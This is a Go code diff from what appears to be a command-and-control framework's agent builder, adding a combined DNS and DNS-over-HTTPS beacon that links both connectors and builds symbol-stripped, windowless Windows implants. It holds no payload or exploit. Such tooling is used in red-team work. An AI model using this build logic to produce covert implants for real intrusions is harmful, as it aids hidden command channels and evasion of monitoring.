@@ -38,14 +38,15 @@ type GenerateConfig struct {
 }
 
 var (
-	ObjectDir_http = "objects_http"
-	ObjectDir_smb  = "objects_smb"
-	ObjectDir_tcp  = "objects_tcp"
-	ObjectDir_dns  = "objects_dns"
-	ObjectDir_doh  = "objects_doh"
-	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
-	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
-	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
+	ObjectDir_http    = "objects_http"
+	ObjectDir_smb     = "objects_smb"
+	ObjectDir_tcp     = "objects_tcp"
+	ObjectDir_dns     = "objects_dns"
+	ObjectDir_doh     = "objects_doh"
+	ObjectDir_dns_doh = "objects_dns_doh"
+	ObjectFiles       = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	CFlags            = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
+	LFlags            = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
 
 func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
@@ -377,10 +378,12 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		// link against ws2_32 to resolve __imp_htons and related symbols.
 		extraLibs = "-lws2_32"
 	} else if protocol == "doh" {
-		ObjectDir = ObjectDir_doh
-		ConnectorFile = "ConnectorDoH"
-		// ConnectorDoH uses WinINet
-		extraLibs = "-lwininet"
+		// "doh" listener now builds the combined DNS+DoH beacon (BEACON_DNS_DOH)
+		// whose objects live under objects_dns_doh. We link both ConnectorDNS
+		// and ConnectorDoH and require both ws2_32 and wininet.
+		ObjectDir = ObjectDir_dns_doh
+		ConnectorFile = "ConnectorDNS"
+		extraLibs = "-lws2_32 -lwininet"
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
@@ -419,7 +422,15 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	}
 
 	Files := tempDir + "/config.o "
-	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
+	// For DNS+DoH (protocol == "doh"), we must link both ConnectorDNS and ConnectorDoH
+	// from the BEACON_DNS_DOH object directory. Other protocols still link a single
+	// connector specified by ConnectorFile.
+	if protocol == "doh" {
+		Files += ObjectDir + "/ConnectorDNS" + Ext + " "
+		Files += ObjectDir + "/ConnectorDoH" + Ext + " "
+	} else {
+		Files += ObjectDir + "/" + ConnectorFile + Ext + " "
+	}
 	for _, ofile := range ObjectFiles {
 		Files += ObjectDir + "/" + ofile + Ext + " "
 	}
